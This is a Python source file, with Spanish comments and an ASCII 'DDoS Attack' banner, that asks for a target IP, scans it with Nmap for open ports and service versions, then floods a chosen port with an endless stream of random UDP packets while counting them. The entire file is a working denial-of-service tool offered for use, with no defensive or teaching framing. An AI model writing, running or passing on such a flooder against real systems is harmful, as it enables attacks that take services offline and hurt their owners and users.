import os
import time
import socket
import random
import nmap
from colorama import *
from datetime import datetime

# Función para limpiar la pantalla de la terminal.
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

# Función para validar si la entrada es una dirección IP válida o una URL válida.
def validate_input(input_data):
    try:
        socket.inet_aton(input_data) # Intenta convertir la entrada en una dirección IP válida.
        return True
    except socket.error:
        return False

# Función para realizar el escaneo de puertos con Nmap.
def scan_ports(ip):
    # Información sobre el inicio del escaneo.
    print("\n Escaneando puertos con Nmap...")
    # Crear un objeto nmap.PortScanner().
    nm = nmap.PortScanner()
    # Realizar el escaneo de puertos con argumentos específicos.
    nm.scan(hosts=ip, arguments='-v -sV')  # Escaneo de todos los puertos, con salida detallada y detección de versiones.

    # Mostrar los puertos abiertos durante el escaneo.
    for host in nm.all_hosts():
        print(f"Host : {host} ({nm[host].hostname()})")
        print("State : %s" % nm[host].state())
        for proto in nm[host].all_protocols():
            print("Protocol : %s" % proto)

            # Obtener la lista de puertos y clasificarla.
            port_list = nm[host][proto].keys()
            sorted(port_list)
            for port in port_list:
                # Verificar si el puerto está abierto y mostrar su estado.
                if nm[host][proto][port]['state'] == 'open':
                    print("Port : %s\tState : %s" % (port, nm[host][proto][port]['state']))

# Función para iniciar el ataque DDoS.
def start_ddos_attack(ip, port):
    # Crear el socket UDP.
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)

    # Limpiar la pantalla antes de iniciar el ataque.
    clear_screen()
    # Mostrar mensaje de inicio del ataque.
    print(Fore.BLACK + Back.GREEN + "\n[+] Attack Starting")
    # Esperar un breve momento antes de continuar.
    time.sleep(0.3)

    # Contador de paquetes enviados.
    sent = 0

    try:
        while True:
            # Enviar paquete UDP al objetivo.
            sock.sendto(bytes, (ip, port))
            # Incrementar el contador de paquetes enviados.
            sent = sent + 1
            # Limpiar la pantalla y mostrar información del ataque.
            clear_screen()
            banner()
            print("IP Target: ", ip)
            print("Port: ", port)
            print("Packets Sent: ", sent)
    except KeyboardInterrupt:
        # Mostrar mensaje cuando se detiene el ataque por interrupción del teclado.
        banner()
        print(Fore.BLACK + Back.RED + "\n[+] Attack Stopped" + Style.RESET_ALL)

# Función para mostrar el banner del programa.
def banner():
    cartel = r"""
    ___  ___      ___     _  _   _           _   
   |   \|   \ ___/ __|   /_\| |_| |_ __ _ __| |__
   | |) | |) / _ \__ \  / _ \  _|  _/ _` / _| / /
   |___/|___/\___/___/ /_/ \_\__|\__\__,_\__|_\_\                                            
                                             
    """
    clear_screen()
    print(Fore.LIGHTYELLOW_EX + cartel)
    print("**************************************************" + Style.RESET_ALL)

# Variable para controlar la ejecución del programa.
ejecutar_programa = True

# Función para salir del programa.
def salir():
    global ejecutar_programa
    ejecutar_programa = False

# Función principal.
def ddos_attack_main():
    clear_screen()
    banner()
    global ejecutar_programa
    while ejecutar_programa:
        # Validar la entrada del usuario para IP o URL.
        while True:
            print("* Pulse Ctrl + C para parar el ataque (una vez activo)\n")
            print("* Escribe 'n' para volver al menu")
            print("____________________________________________________")
            target = input("\nIP o URL objetivo (sin http o https): ")
            if target.lower() == 'n':
                salir()  # Salir del programa.
                break
            elif validate_input(target):
                break
            else:
                print(Fore.BLACK + Back.RED + " Error al insertar datos, revise el formato " + Style.RESET_ALL)

        if not ejecutar_programa:
            break

        scan_ports(target)

        while True:
            try:
                port = int(input("Inserte puerto para el ataque: "))
                break
            except ValueError:
                print(Fore.BLACK + Back.RED + "Datos inválidos" + Style.RESET_ALL)

        start_ddos_attack(target, port)

if __name__ == "__main__":
    ddos_attack_main()
